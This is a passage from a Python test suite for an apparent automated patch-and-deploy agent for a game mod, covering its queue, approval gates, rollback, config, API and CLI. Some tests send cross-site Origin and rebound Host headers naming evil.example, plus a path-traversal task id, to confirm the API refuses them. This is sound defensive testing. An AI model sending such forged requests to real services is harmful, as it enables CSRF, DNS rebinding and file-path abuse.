    r = eng.deploy("E0003", confirm=True)
    check("deploy failure that left the game DOWN (script killed it, then failed; DLL unchanged) still rolls back: the restore hook relaunches with the backup",
          r["status"] == "rolled-back" and len(env.deployer.restores) == 1 and env.deployer.dll.read_bytes() == b"OLD-DLL", r)
    env, real, eng = applied_env(tmp, "dep8")
    env.deployer.dll.unlink()
    r = eng.deploy("E0003", confirm=True)
    check("deploy: without a deployed DLL to back up there is no rollback path, so it refuses (require_backup)", r["ok"] is False and "no deployed DLL" in r["error"] and env.deployer.deploys == 0, r)
    env = Env(tmp, "dep9", replies=[{"action": "create", "path": "docs/NEW.md", "content": "# notes\n"}, FINISH])
    env.eng.run_task("E0003")
    real, eng = env.real()
    eng.apply_patch("E0003")
    r = eng.deploy("E0003", confirm=True)
    check("deploy: a docs-only patch has nothing to deploy to the game", r["ok"] is False and "nothing to deploy" in r["error"] and env.deployer.deploys == 0, r)
    env, real, eng = applied_env(tmp, "dep10")
    env.deployer.health = lambda ctx: (_ for _ in ()).throw(RuntimeError("boom"))
    eng2 = env.make(real)
    eng2.health_fn = env.deployer.health
    r = eng2.deploy("E0003", confirm=True)
    check("deploy: a crashing health hook counts as unhealthy and triggers the rollback", r["status"] == "rolled-back" and "health check crashed" in r["error"], r)


# ================================================================================================================ I. bookkeeping, config, autorun, API, CLI
def test_queue_and_status(tmp):
    rows = [dict(sim.TASK, id="E0001", t=100.0, priority="normal", title="old normal"), dict(sim.TASK, id="E0002", t=200.0, priority="urgent", title="urgent B"),
            dict(sim.TASK, id="E0003", t=150.0, priority="urgent", title="urgent A"), dict(sim.TASK, id="E0004", t=300.0, priority="low", title="low"),
            dict(sim.TASK, id="E0005", t=50.0, priority="urgent", title="done already")]
    for i, r in enumerate(rows):
        r["function"] = "Target%d" % i                                  # distinct file+function guesses (same guess = same target, see the duplicate tests below)
    env = Env(tmp, "queue", tasks=rows)
    with open(env.agent / "engineer-queue.jsonl", "a") as f:
        f.write("this is not json\n\n{\"no_id\": 1}\n")
    env.eng._update("E0005", status="deployed", finished=1.0)
    qh = sha(env.agent / "engineer-queue.jsonl")
    q = env.eng.queue()
    check("queue(): merged list, newest first, bad/blank/id-less lines skipped", [r["id"] for r in q] == ["E0004", "E0002", "E0003", "E0001", "E0005"], [r["id"] for r in q])
    check("queue(): sidecar status overrides the queue file's 'queued'; queue_status keeps the original", q[-1]["status"] == "deployed" and q[-1]["queue_status"] == "queued" and q[0]["status"] == "queued")
    check("queue(): each row lists the actions the UI may offer for its status", q[0]["allowed"] == ["run", "reject"] and q[-1]["allowed"] == ["diff"])
    check("next_task(): urgent before normal before low; oldest first within a priority; non-queued skipped", env.eng.next_task()["id"] == "E0003")
    env.eng._update("E0003", status="rejected")
    check("next_task(): moves on to the next urgent task after the first one is handled", env.eng.next_task()["id"] == "E0002")
    env.eng._update("E0002", status="queued", attempts=3)
    check("next_task(): a task that used all its attempts is skipped by autorun", env.eng.next_task()["id"] == "E0001")
    check("queue file is never written by status updates", sha(env.agent / "engineer-queue.jsonl") == qh)
    r = env.eng.reject("E0001", "duplicate of E0003")
    rec = env.rec("E0001")
    check("reject(): a queued task becomes rejected with the reason and a timestamp", r["ok"] and rec["status"] == "rejected" and rec["reject_reason"] == "duplicate of E0003" and rec["rejected_at"] > 0)
    env.eng._update("E0002", status="working")
    check("reject(): a task that is working/applied/deployed cannot be rejected", env.eng.reject("E0002")["ok"] is False and env.eng.reject("E0005")["ok"] is False and env.eng.reject("NOPE")["ok"] is False)
    check("requeue(): rejected -> queued (attempts reset); a working task cannot be requeued", env.eng.requeue("E0001")["status"] == "queued" and env.rec("E0001")["attempts"] == 0 and env.eng.requeue("E0002")["ok"] is False)
    st = env.eng.status()
    check("status(): counts by status, config, cooldowns, next task, awaiting lists, current=None when idle", st["counts"]["total"] == 5 and st["counts"]["queued"] == 2 and st["counts"]["working"] == 1 and st["current"] is None
          and st["mode"] == "semi" and st["auto_deploy"] is False and st["next"]["id"] in ("E0003", "E0001", "E0004") and st["awaiting_approval"] == [] and "deploy_remaining_s" in st["cooldown"] and st["config"]["max_steps"] == 28, st)
    check("status(): last_results lists finished tasks with their summary fields", st["last_results"] and st["last_results"][0]["id"] == "E0005")


def test_same_target(tmp):
    a = dict(sim.TASK, id="E0001", t=100.0, title="first")
    b = dict(sim.TASK, id="E0002", t=200.0, title="same defect, filed again with different words")
    c = dict(sim.TASK, id="E0003", t=300.0, title="something else", function="Other.Thing")
    env = Env(tmp, "same_target", tasks=[a, b, c])
    q = {r["id"]: r for r in env.eng.queue()}
    check("queue(): a row that names the same file+function guess as an earlier row is annotated same_target_as (the responder files the same defect repeatedly)",
          q["E0002"].get("same_target_as") == "E0001" and "same_target_as" not in q["E0001"] and "same_target_as" not in q["E0003"], {k: v.get("same_target_as") for k, v in q.items()})
    check("next_task(): normally the oldest task", env.eng.next_task()["id"] == "E0001")
    env.eng._update("E0001", status="patched")
    check("next_task(): while a task for that target awaits approval, its duplicates are not started (two patches for one target only conflict) - the next independent task is", env.eng.next_task()["id"] == "E0003")
    env.eng._update("E0001", status="working")
    check("next_task(): ... nor while it is being worked on", env.eng.next_task()["id"] == "E0003")
    env.eng._update("E0001", status="deployed")
    check("next_task(): once the first task is deployed the duplicate is eligible again (it may be a valid refinement)", env.eng.next_task()["id"] == "E0002")
    env.eng._update("E0001", status="rejected")
    check("next_task(): a rejected task does not block its duplicates", env.eng.next_task()["id"] == "E0002")
    rows = [dict(sim.TASK, id="E0009", file="", function="")]
    sim.write_queue(env.agent, rows + [dict(sim.TASK, id="E0010", file="", function="")])
    q = {r["id"]: r for r in env.eng.queue()}
    check("queue(): tasks without a file+function guess are never grouped", "same_target_as" not in q["E0010"])


def test_config(tmp):
    env = Env(tmp, "cfg")
    cc = env.agent / "cc-config.json"
    cc.write_text(json.dumps({"enabled": True, "wake": {"x": 1}, "engineer": {"mode": "auto", "auto_deploy": "false", "max_steps": "12", "deploy_cooldown_s": 60.0, "bogus": 1}}))
    eng = me.Engineer(str(env.repo), str(env.agent), env.chat, runner=env.runner, clock=env.clock, log=env.logs.append)
    c = eng.get_cfg()
    check("config: read from cc-config.json 'engineer' (strings coerced, unknown keys ignored); auto_deploy 'false' is False", c["mode"] == "auto" and c["auto_deploy"] is False and c["max_steps"] == 12 and c["deploy_cooldown_s"] == 60 and "bogus" not in c)
    check("config: defaults match the spec (mode semi, auto_deploy off, 28 steps, 400k tokens, 14 min, 400 lines, 6 files, gap 600, cooldown 900)",
          me.DEFAULT_CFG["mode"] == "semi" and me.DEFAULT_CFG["auto_deploy"] is False and me.DEFAULT_CFG["max_steps"] == 28 and me.DEFAULT_CFG["max_tokens_total"] == 400000 and me.DEFAULT_CFG["wall_timeout_s"] == 840
          and me.DEFAULT_CFG["max_changed_lines"] == 400 and me.DEFAULT_CFG["max_files"] == 6 and me.DEFAULT_CFG["min_gap_s"] == 600 and me.DEFAULT_CFG["deploy_cooldown_s"] == 900)
    cc.write_text(json.dumps({"engineer": {"mode": "yolo", "auto_deploy": True}}))
    check("config: an invalid mode fails safe to off; auto_deploy only counts when literally true", eng.get_cfg()["mode"] == "off" and eng.get_cfg()["auto_deploy"] is True)
    cc.write_text("{not json")
    check("config: a corrupt config file falls back to the defaults", eng.get_cfg()["mode"] == "semi")
    cc.write_text(json.dumps({"enabled": True, "jobs": {"pulse_s": 60}, "engineer": {"mode": "semi"}}))
    new = eng.set_cfg({"mode": "auto", "auto_deploy": True, "max_steps": 10, "evil": "x"})
    saved = json.loads(cc.read_text())
    check("set_cfg(): writes only the 'engineer' key (the command center's other settings survive) and ignores unknown keys", saved["jobs"] == {"pulse_s": 60} and saved["enabled"] is True and saved["engineer"] == {"mode": "auto", "auto_deploy": True, "max_steps": 10} and new["mode"] == "auto")
    try:
        eng.set_cfg({"mode": "wild"})
        check("set_cfg(): an invalid mode is rejected", False)
    except ValueError:
        check("set_cfg(): an invalid mode is rejected", True)
    eng2 = me.Engineer(str(env.repo), str(env.agent), env.chat, cfg={"mode": "off"}, runner=env.runner, clock=env.clock, log=env.logs.append)
    check("config: the constructor's cfg argument overrides the file", eng2.get_cfg()["mode"] == "off")


def test_autorun(tmp):
    env = Env(tmp, "auto_off", replies=list(HAPPY), cfg={"mode": "off"})
    check("autorun: mode off does nothing", env.eng.maybe_autorun(sync=True)["action"] == "idle" and not env.chat.calls)
    env = Env(tmp, "auto_semi", replies=list(HAPPY), cfg={"mode": "semi", "min_gap_s": 600})
    r = env.eng.maybe_autorun(sync=True)
    check("autorun (semi): runs the next queued task and only PREPARES the patch (status patched, real tree untouched, nothing applied)", r["action"] == "run" and r["result"]["status"] == "patched" and env.rec()["status"] == "patched" and (env.repo / "src" / "picker.py").read_text() == sim.PICKER)
    t4 = dict(sim.TASK, id="E0004", title="another task", function="Other.Another")
    sim.write_queue(env.agent, [dict(sim.TASK), t4])
    r = env.eng.maybe_autorun(sync=True)
    check("autorun (semi): at most one task per min_gap_s (600): the next call waits", r["action"] == "wait" and r["reason"] == "min_gap_s" and 590 <= r["wait_s"] <= 600, r)
    env.clock.t += 601
    env.chat.replies = [{"action": "finish", "no_change": True, "summary": "nothing"}]
    r = env.eng.maybe_autorun(sync=True)
    check("autorun (semi): after the gap the next task runs; a patched task is never applied in semi mode", r["action"] == "run" and r["task"] == "E0004" and env.rec()["status"] == "patched" and (env.repo / "src" / "picker.py").read_text() == sim.PICKER)
    env2 = Env(tmp, "auto_pending", replies=list(HAPPY), cfg={"mode": "semi", "max_pending_patches": 1})
    env2.eng.maybe_autorun(sync=True)
    env2.clock.t += 700
    r = env2.eng.maybe_autorun(sync=True)
    check("autorun (semi): pauses while max_pending_patches patches wait for approval", r["action"] == "wait" and "wait for approval" in r["reason"], r)
    # busy
    gate, inside = threading.Event(), threading.Event()
    env3 = Env(tmp, "auto_busy", replies=[lambda m: (inside.set(), gate.wait(10), {"action": "ls"})[2]] + HAPPY, cfg={"mode": "semi"})
    started = env3.eng.maybe_autorun(sync=False)
    inside.wait(10)                                                         # the worker is now inside its first model call
    r = env3.eng.maybe_autorun(sync=False)
    gate.set()
    env3.eng.thread.join(30)
    check("autorun: asynchronous start returns immediately; while running, another call reports busy", started["started"] is True and r["action"] == "busy" and env3.rec()["status"] == "patched", (started, r))
    # auto mode: applies, deploy only with auto_deploy
    env = Env(tmp, "auto_apply", replies=list(HAPPY), cfg={"mode": "auto", "auto_deploy": False})
    real, eng = env.real()
    r = eng.maybe_autorun(sync=True)
    rec = env.rec()
    check("autorun (auto): runs the task AND applies the patch to the real tree (build gate passed), but does not deploy (auto_deploy off)", rec["status"] == "applied" and r["result"].get("applied", {}).get("status") == "applied" and "in blocked" in (real / "src" / "picker.py").read_text() and env.deployer.deploys == 0, (r, rec["status"]))
    r = eng.maybe_autorun(sync=True)
    check("autorun (auto): with auto_deploy off an applied task just waits for the human", env.deployer.deploys == 0 and env.rec()["status"] == "applied" and r["action"] in ("wait", "idle"), r)
    env = Env(tmp, "auto_deploy", replies=list(HAPPY), cfg={"mode": "auto", "auto_deploy": True})
    real, eng = env.real()
    r = eng.maybe_autorun(sync=True)
    check("autorun (auto + auto_deploy): runs, applies and deploys with confirm=True through the guarded deploy (backup, health check)", env.rec()["status"] == "deployed" and env.deployer.deploys == 1 and len(env.deployer.health_ctx) == 1 and list((env.agent / "engineer" / "backups").glob("*.dll")), (r, env.rec()["status"]))
    # guards: server files and warnings are never auto-applied
    srv = {"tools/command_center.py": "import json\n"}
    env = Env(tmp, "auto_server", replies=[{"action": "edit", "path": "tools/command_center.py", "old": "import json", "new": "import json  # x"}, FINISH], cfg={"mode": "auto", "auto_deploy": True}, extra_files=srv)
    real, eng = env.real()
    eng.maybe_autorun(sync=True)
    r = eng.maybe_autorun(sync=True)
    check("autorun (auto): a patch that touches the coach server needs a human - it is not applied automatically", env.rec()["status"] == "patched" and env.rec()["touches_server"] is True and not env.runner.build_calls[-1:] == [str(real)])
    env = Env(tmp, "auto_warn", replies=[{"action": "create", "path": "src/Patch.cs", "content": "[HarmonyPatch(typeof(Hp), \"X\")] class P {}\n"}, FINISH], cfg={"mode": "auto", "auto_deploy": True})
    real, eng = env.real()
    eng.maybe_autorun(sync=True)
    check("autorun (auto): scan warnings (e.g. a new Harmony patch) block auto-apply - the patch waits for approval", env.rec()["status"] == "patched" and env.rec()["safety_warnings"] and env.rec()["safety_warnings"][0]["rule"] == "harmony-patch", env.rec().get("safety_warnings"))
    env = Env(tmp, "auto_big", replies=[{"action": "create", "path": "src/big.py", "content": "\n".join("v%d = %d" % (i, i) for i in range(200)) + "\n"}, FINISH], cfg={"mode": "auto", "auto_deploy": True})
    real, eng = env.real()
    eng.maybe_autorun(sync=True)
    check("autorun (auto): a patch over auto_deploy_max_lines (150) is applied but NOT deployed unattended", env.rec()["status"] == "applied" and env.deployer.deploys == 0, env.rec()["status"])
    env = Env(tmp, "auto_empty", cfg={"mode": "semi"})
    sim.write_queue(env.agent, [])
    check("autorun: an empty queue is idle", env.eng.maybe_autorun(sync=True)["action"] == "idle")


def test_api(tmp):
    env = patched_env(tmp, "api")
    real, eng = env.real()
    code, st = eng.api_get("/engineer")
    check("api: GET /engineer returns the UI status (counts, config, awaiting_approval)", code == 200 and st["awaiting_approval"] == ["E0003"] and st["counts"]["patched"] == 1 and st["mode"] == "semi")
    code, q = eng.api_get("/engineer/queue?n=5")
    check("api: GET /engineer/queue returns the merged queue with allowed actions", code == 200 and q[0]["id"] == "E0003" and q[0]["status"] == "patched" and "apply" in q[0]["allowed"])
    code, d = eng.api_get("/engineer/diff?id=E0003")
    check("api: GET /engineer/diff returns the diff text", code == 200 and d["diff"].startswith("diff --git a/src/picker.py") and d["task"]["id"] == "E0003")
    check("api: GET /engineer/diff for an unknown id is 404, and ids are sanitised", eng.api_get("/engineer/diff?id=..%2F..%2Fx")[0] == 404)
    code, lg = eng.api_get("/engineer/log?id=E0003&n=3")
    check("api: GET /engineer/log returns the transcript tail", code == 200 and len(lg["log"]) == 3 and lg["log"][-1]["action"] == "finish")
    check("api: unrelated paths are not handled (None)", eng.api_get("/health") is None and eng.api_post("/health", {}) is None)
    code, r = eng.api_post("/engineer/apply", {"id": "E0003"}, sync=True)
    check("api: POST /engineer/apply (sync) applies the patch", code == 200 and r["status"] == "applied")
    code, r = eng.api_post("/engineer/deploy", {"id": "E0003"}, sync=True)
    check("api: POST /engineer/deploy without confirm:true is refused", r["ok"] is False and "confirmation" in r["error"] and env.deployer.deploys == 0)
    code, r = eng.api_post("/engineer/deploy", {"id": "E0003", "confirm": True}, sync=True)
    check("api: POST /engineer/deploy with confirm:true deploys", code == 200 and r["status"] == "deployed" and env.deployer.deploys == 1)
    check("api: unknown task ids are 404", eng.api_post("/engineer/apply", {"id": "E9999"})[0] == 404)
    code, r = eng.api_post("/engineer/config", {"mode": "auto", "auto_deploy": True, "junk": 1})
    check("api: POST /engineer/config persists mode/auto_deploy", code == 200 and r["config"]["mode"] == "auto" and r["config"]["auto_deploy"] is True)
    check("api: POST /engineer/config rejects an invalid mode", eng.api_post("/engineer/config", {"mode": "x"})[0] == 400)
    # browser-attack guard (CSRF / DNS rebinding) when the HTTP handler passes the request headers
    good = {"Host": "127.0.0.1:8099", "Origin": "http://127.0.0.1:8099", "Content-Type": "application/json"}
    env3 = patched_env(tmp, "api_guard")
    real3, eng3 = env3.real()
    for why, hdr, want in (("a cross-site Origin", dict(good, Origin="https://evil.example"), 403), ("a rebound Host name", dict(good, Host="evil.example:8099"), 403),
                           ("a form-style text/plain body (a 'simple' cross-site request)", dict(good, **{"Content-Type": "text/plain"}), 415), ("a missing Content-Type", {"Host": "127.0.0.1:8099"}, 415)):
        code, r = eng3.api_post("/engineer/apply", {"id": "E0003"}, sync=True, headers=hdr)
        check("api guard: POST /engineer/apply with %s is refused (%d) and changes nothing" % (why, want), code == want and r["ok"] is False and env3.rec()["status"] == "patched" and (real3 / "src" / "picker.py").read_text() == sim.PICKER, (code, r))
    code, r = eng3.api_post("/engineer/config", {"mode": "auto", "auto_deploy": True}, headers=dict(good, Origin="http://attacker.test"))
    check("api guard: the config endpoint (mode/auto_deploy) cannot be flipped from another origin", code == 403 and eng3.get_cfg()["mode"] == "semi" and eng3.get_cfg()["auto_deploy"] is False, (code, r))
    code, r = eng3.api_get("/engineer", headers={"Host": "evil.example:8099"})
    check("api guard: GET /engineer with a non-loopback Host is refused too (DNS rebinding could otherwise read the queue and diffs)", code == 403)
    code, r = eng3.api_get("/engineer", headers={"Host": "localhost:8099", "Origin": "http://localhost:8099"})
    check("api guard: localhost / 127.0.0.1 / [::1] Hosts and Origins pass", code == 200 and eng3.api_get("/engineer", headers={"Host": "[::1]:8099"})[0] == 200 and eng3.api_get("/engineer", headers={"host": "127.0.0.1"})[0] == 200)
    code, r = eng3.api_post("/engineer/apply", {"id": "E0003"}, sync=True, headers=dict(good, **{"content-type": "application/json; charset=utf-8"}))
    check("api guard: a legitimate same-origin application/json POST (charset parameter allowed) goes through", code == 200 and r["status"] == "applied", (code, r))
    check("api guard: paths that are not ours are not guarded or handled", eng3.api_post("/order", {}, headers={"Host": "evil.example"}) is None and eng3.api_get("/health", headers={"Host": "evil.example"}) is None)
    env2 = Env(tmp, "api2", replies=list(HAPPY))
    code, r = env2.eng.api_post("/engineer/run", {"id": "E0003"})
    check("api: POST /engineer/run answers 202 immediately and works in a thread", code == 202 and r["started"] == "E0003")
    env2.eng.thread.join(30)
    check("api: ... and the run completes in the background", env2.rec()["status"] == "patched")
    code, r = env2.eng.api_post("/engineer/reject", {"id": "E0003", "reason": "not needed"})
    check("api: POST /engineer/reject rejects a patched task", code == 200 and r["ok"] and env2.rec()["status"] == "rejected")
    code, r = env2.eng.api_post("/engineer/requeue", {"id": "E0003"})
    check("api: POST /engineer/requeue puts it back", r["status"] == "queued")


def test_recovery_and_cli(tmp):
    env = Env(tmp, "recover")
    env.eng._update("E0003", status="working", started=1.0)
    eng2 = env.make(env.repo)
    check("recovery: a task left 'working' by a crashed process is marked failed (interrupted) on the next start", env.rec()["status"] == "failed" and "interrupted" in env.rec()["error"] and env.rec()["history"][-1]["event"] == "recovered")
    env.eng._update("E0003", status="deploying")
    env.make(env.repo)
    check("recovery: an interrupted deploy leaves the task 'applied' with a warning", env.rec()["status"] == "applied" and "interrupted during deploy" in env.rec()["error"])
    env.eng._update("E0003", status="applying")
    env.make(env.repo)
    check("recovery: an interrupted apply becomes apply-failed with the revert hint", env.rec()["status"] == "apply-failed" and "revert" in env.rec()["error"])
    env.eng._update("E0003", status="working", started=1.0)
    r = env.eng.maybe_autorun(sync=True)
    check("recovery: a 'working' task left behind by a dead run is healed by the next maybe_autorun() - no restart needed - and does not block the queue", env.rec()["status"] == "failed" and "interrupted" in env.rec()["error"] and r["action"] in ("wait", "idle"), (env.rec()["status"], r))

    env = patched_env(tmp, "cli")
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        rc = me.main(["--agent", str(env.agent), "--repo", str(env.repo), "--list"])
    check("cli: --list prints the merged queue", rc == 0 and "E0003" in out.getvalue() and "patched" in out.getvalue(), out.getvalue())
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        rc = me.main(["--agent", str(env.agent), "--repo", str(env.repo), "--diff", "E0003"])
    check("cli: --diff prints the exported diff", rc == 0 and out.getvalue().startswith("diff --git a/src/picker.py"))
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        rc = me.main(["--agent", str(env.agent), "--repo", str(env.repo), "--reject", "E0003", "too risky"])
    check("cli: --reject takes the reason as the next argument", rc == 0 and env.rec()["status"] == "rejected" and env.rec()["reject_reason"] == "too risky")
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        rc = me.main(["--agent", str(env.agent), "--repo", str(env.repo), "--deploy", "E0003"])
    check("cli: --deploy does not exist (deploying restarts the game and needs the UI approval)", rc == 2 and "not available" in out.getvalue() and env.rec()["status"] == "rejected")
    env = patched_env(tmp, "cli2")
    real, _eng = env.real()
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        rc = me.main(["--agent", str(env.agent), "--repo", str(real), "--apply", "E0003"])
    check("cli: --apply goes through the same guarded path with the PRODUCTION runner: the sandbox has no ThronefallTrainer.csproj, so the build gate fails and the patch is restored automatically",
          rc == 1 and '"status": "apply-failed"' in out.getvalue() and (real / "src" / "picker.py").read_text() == sim.PICKER and env.rec()["status"] == "apply-failed" and "csproj" in env.rec()["error"], (out.getvalue()[:300], env.rec().get("error")))
    def cli(*argv):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc = me.main(["--agent", str(env.agent), "--repo", str(env.repo)] + list(argv))
        return rc, buf.getvalue()
    rc, txt = cli("--status")
    check("cli: --status prints the UI status JSON", rc == 0 and json.loads(txt)["counts"]["total"] == 1 and json.loads(txt)["mode"] == "semi", txt[:200])
    rc, txt = cli("--run", "E9999")
    check("cli: --run with an unknown id fails cleanly (rc 1, no model call)", rc == 1 and "unknown task" in txt, txt)
    rc, txt = cli("--diff", "E9999")
    check("cli: --diff for a task without a diff says so (rc 1)", rc == 1 and "no diff" in txt)
    env.eng._update("E0003", status="queued")
    rc, txt = cli("--revert", "E0003")
    check("cli: --revert refuses a task that is not applied", rc == 1 and "only an applied task" in txt, txt)
    env.eng._update("E0003", status="rejected")
    rc, txt = cli("--requeue", "E0003")
    check("cli: --requeue puts a rejected task back in the queue", rc == 0 and env.rec()["status"] == "queued", txt)
    helptext = io.StringIO()
    with contextlib.redirect_stdout(helptext), contextlib.suppress(SystemExit):
        me.main(["--help"])
    check("cli: --help documents list/run/apply/diff/reject and no deploy option", all(o in helptext.getvalue() for o in ("--list", "--run", "--apply", "--diff", "--reject")) and "--deploy" not in helptext.getvalue())


# ================================================================================================================ J. production runner (fake process hook)
def test_runner(tmp):
    root = Path(tmp) / "runner_ws"
    for rel, txt in {"src/ThronefallTrainer.csproj": "<Project/>", "tests/GatePlanner.Tests/GatePlanner.Tests.csproj": "<Project/>", "tests/Replay/Replay.csproj": "<Project/>",
                     "tests/test_incidents.py": "", "tests/test_command_center.py": "", "tests/test_mm_engineer.py": "", "tools/bot-lint.ps1": "x"}.items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_text(txt)
    calls = []
    msb_err = "%s\\src\\Bot.cs(2801,12): error CS0103: The name 'x' does not exist in the current context [%s\\src\\ThronefallTrainer.csproj]\n" % (root, root)

    def fake_run(args, cwd=None, timeout=300, env=None):
        calls.append(([str(a) for a in args], str(cwd), timeout))
        a = [str(x) for x in args]
        if os.path.basename(a[0]).lower() in ("dotnet", "dotnet.exe"):
            if a[1] == "build" and "ThronefallTrainer.csproj" in a[2]:
                return (1, msb_err * 2, False) if FAIL_BUILD[0] else (0, "", False)
            if a[1] == "build":
                out = a[a.index("-o") + 1]
                name = Path(a[2]).parent.name
                Path(out).mkdir(parents=True, exist_ok=True)
                Path(out, name + ".runtimeconfig.json").write_text("{}")
                return 0, "", False
            if a[1].endswith(".dll"):
                if "GatePlanner" in a[1]:
                    return 1, "[PASS] one\n[PASS] two\n[FAIL] heuristic: respects the failed-gate filter  got none\nSUMMARY: 2 passed, 1 FAILED\n", False
                return 1, "replay: durststein-dto - 1/163 mode mismatches FAIL, first: t=164.93\nreplay: 1/1 fixture(s) FAIL\n", False
        if a[0].lower().endswith("python.exe") or a[0].endswith("python") or "python" in os.path.basename(a[0]).lower():
            return (0, "[PASS] a\n[PASS] b\nALL PASSED - 2 checks\n", False) if "incidents" in a[-1] else (2, "Traceback (most recent call last):\nRuntimeError: boom\n", False)
        return 1, "[PASS] legit-gate\n[FAIL] unscaled-time: Time.time used in Bot.cs\n[WARN] overlay: toggle missing\nbot-lint: 1 FAIL, 1 WARN\n", False
    FAIL_BUILD = [False]
    r = me.Runner(r"K:\Game", run=fake_run, python=sys.executable)
    res = r.build(root, out_dir=Path(tmp) / "runner_scratch")
    cmd = " ".join(calls[0][0])
    check("runner.build: runs dotnet build on src/ThronefallTrainer.csproj in Release with scratch artifacts, OutputPath and GameDir - never Trainer\\bin",
          res["ok"] and "build" in calls[0][0] and "-c Release" in cmd and "--artifacts-path" in cmd and "runner_scratch/out/" in cmd.replace("\\", "/") and "-p:GameDir=K:/Game" in cmd and "-nodeReuse:false" in cmd and "\\bin" not in cmd.replace("/", "\\").replace("runner_scratch", ""), cmd)
    FAIL_BUILD[0] = True
    res = r.build(root, out_dir=Path(tmp) / "runner_scratch2")
    check("runner.build: compiler errors are parsed, de-duplicated and the workspace path is stripped", not res["ok"] and res["errors"] == ["src\\Bot.cs(2801,12): error CS0103: The name 'x' does not exist in the current context"], res["errors"])
    calls.clear()
    FAIL_BUILD[0] = False
    res = r.test(root)
    names = sorted(res["suites"])
    check("runner.test: discovers the C# test projects and the python tests (never test_mm_engineer.py) and lint", names == ["GatePlanner.Tests", "Replay", "lint", "py/test_command_center.py", "py/test_incidents.py"], names)
    r2 = me.Runner(r"K:\Game", run=fake_run, skip_py=["test_incidents.py"], skip_cs=["Replay"])
    cs2, py2 = r2.suites(root)
    check("runner: skip_py / skip_cs (cfg skip_python_tests / skip_test_projects) exclude suites; test_mm_engineer.py is always excluded",
          [p.parent.name for p in cs2] == ["GatePlanner.Tests"] and [p.name for p in py2] == ["test_command_center.py"], (cs2, py2))
    eng_cfg = me.Engineer(str(root), str(Path(tmp) / "runner_agent"), lambda m, max_tokens=0: ("", {}), cfg={"skip_python_tests": ["test_command_center.py"], "skip_test_projects": "not-a-list"}, log=lambda m: None)
    check("config: the production runner is built with the skip lists from the config (a non-list value is ignored)", eng_cfg.runner.skip_py == {"test_command_center.py", "test_mm_engineer.py"} and eng_cfg.runner.skip_cs == set(), (eng_cfg.runner.skip_py, eng_cfg.runner.skip_cs))
    for extra in ("test_wgc_real.py", "test_live_page_e2e.py", "test_page_js.py", "test_livecap.py"):
        (root / "tests" / extra).write_text("raise SystemExit('this opens windows / a browser / captures the screen')\n")
    (root / "tests" / "NewSuite.Tests").mkdir(exist_ok=True)
    (root / "tests" / "NewSuite.Tests" / "NewSuite.Tests.csproj").write_text("<Project/>")
    eng_default = me.Engineer(str(root), str(Path(tmp) / "runner_agent2"), lambda m, max_tokens=0: ("", {}), log=lambda m: None)
    cs3, py3 = eng_default.runner.suites(root)
    check("runner allowlist: the production runner runs only the allowlisted suites - tests/test_wgc_real.py (opens windows, captures the screen), the browser e2e tests and unknown test projects are NOT run unasked",
          sorted(p.name for p in py3) == ["test_command_center.py", "test_incidents.py"] and sorted(p.parent.name for p in cs3) == ["GatePlanner.Tests", "Replay"], ([p.name for p in py3], [p.parent.name for p in cs3]))
    r_all = me.Runner(r"K:\Game", run=fake_run, py_tests=["*"], cs_projects=["*"])
    r_glob = me.Runner(r"K:\Game", run=fake_run, py_tests=["test_live*.py", "TEST_INCIDENTS.PY"], cs_projects=["new*"])
    check("runner allowlist: ['*'] discovers everything; globs are case-insensitive; an empty list runs nothing",
          len(r_all.suites(root)[1]) == 6 and sorted(p.name for p in r_glob.suites(root)[1]) == ["test_incidents.py", "test_live_page_e2e.py", "test_livecap.py"] and [p.parent.name for p in r_glob.suites(root)[0]] == ["NewSuite.Tests"]
          and me.Runner(r"K:\Game", run=fake_run, py_tests=[], cs_projects=[]).suites(root) == ([], []), (len(r_all.suites(root)[1]), [p.name for p in r_glob.suites(root)[1]]))
    for extra in ("test_wgc_real.py", "test_live_page_e2e.py", "test_page_js.py", "test_livecap.py"):
        (root / "tests" / extra).unlink()
    shutil.rmtree(root / "tests" / "NewSuite.Tests")
    check("runner.test: [FAIL] lines, replay mismatches, crashed scripts (exit code) and lint FAILs become named failures", set(res["failures"]) == {"GatePlanner.Tests: heuristic: respects the failed-gate filter", "Replay: durststein-dto", "py/test_command_center.py: exit code 2", "lint: unscaled-time: Time.time used in Bot.cs"}, res["failures"])
    check("runner.test: passed counts, lint FAILs and WARNs are reported separately", res["passed"] == 4 and res["lint_fails"] == ["lint: unscaled-time: Time.time used in Bot.cs"] and res["lint_warns"] == ["lint: overlay: toggle missing"] and res["ok"] is False, (res["passed"], res["lint_fails"]))
    check("runner.test: C# suites are built into a scratch -o dir with GameDir and run with `dotnet <dll>` from the workspace root", any(c[0][1] == "build" and "-o" in c[0] and "-p:GameDir=K:/Game" in c[0] for c in calls) and any(c[0][1].endswith(".dll") and c[1] == str(root) for c in calls))
    check("runner.test: python tests run from the workspace root with the interpreter in use", any(c[0][0] == sys.executable and c[0][-1].endswith("test_incidents.py") and c[1] == str(root) for c in calls))
    check("parse_suite_output: pass count, failure names and details; exit code without [FAIL] lines is a failure", me.parse_suite_output("S", "[PASS] a\n[FAIL] b  because\n", 1) == (1, {"S: b": "because"}) and me.parse_suite_output("S", "boom", 3)[1] == {"S: exit code 3": "boom"} and me.parse_suite_output("S", "[PASS] a\n", 0) == (1, {}))
    check("parse_lint_output: FAIL/WARN names", me.parse_lint_output("[PASS] a\n[FAIL] b: x\n[WARN] c\nbot-lint: 1 FAIL, 1 WARN") == (["b: x"], ["c"]))
    got = me.parse_msbuild_errors("MSBUILD : error MSB1009: Project file does not exist.\nerror NU1101: Unable to find package X [C:\\a.csproj]\nC:\\ws\\work\\src\\T.csproj : error NU1101: no package Y\nBuild succeeded\n  warning CS0618: obsolete\nlog line about error handling, not an error", "C:\\ws\\work")
    check("parse_msbuild_errors: MSBuild/NuGet errors without a source position are kept; warnings and prose mentioning 'error' are not",
          got == ["MSBUILD: error MSB1009: Project file does not exist.", "error NU1101: Unable to find package X", "src\\T.csproj: error NU1101: no package Y"], got)


def test_run_cmd_timeouts(tmp):
    """run_cmd on timeout: tree=True kills the whole process tree (build/test commands), tree=False only the started process (the deploy script, whose child is the relaunched game)."""
    parent = ("import subprocess, sys, time\n"
